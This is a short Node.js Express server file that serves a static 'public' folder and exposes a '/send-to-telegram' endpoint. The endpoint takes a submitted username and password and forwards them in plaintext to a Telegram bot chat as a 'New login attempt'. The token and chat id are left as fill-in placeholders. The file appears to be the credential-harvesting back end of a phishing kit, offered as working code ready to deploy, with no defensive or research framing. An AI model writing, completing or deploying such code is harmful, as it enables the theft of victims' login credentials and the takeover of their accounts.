const express = require('express');
const cors = require('cors');
const axios = require('axios');
const app = express();
const PORT = 3000;
const path = require('path');

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const TELEGRAM_BOT_TOKEN = 'telegram bot  token ';
const CHAT_ID = 'Your chat id';
app.post('/send-to-telegram', async (req, res) => {
    const { username, password } = req.body;
    
    try {
        const message = `New login attempt:\nUsername: ${username}\nPassword: ${password}`;
        
        await axios.post(
            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
            {
                chat_id: CHAT_ID,
                text: message
            }
        );

        res.sendStatus(200);
    } catch (error) {
        console.error('Telegram API error:', error);
        res.sendStatus(500);
    }
});


app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});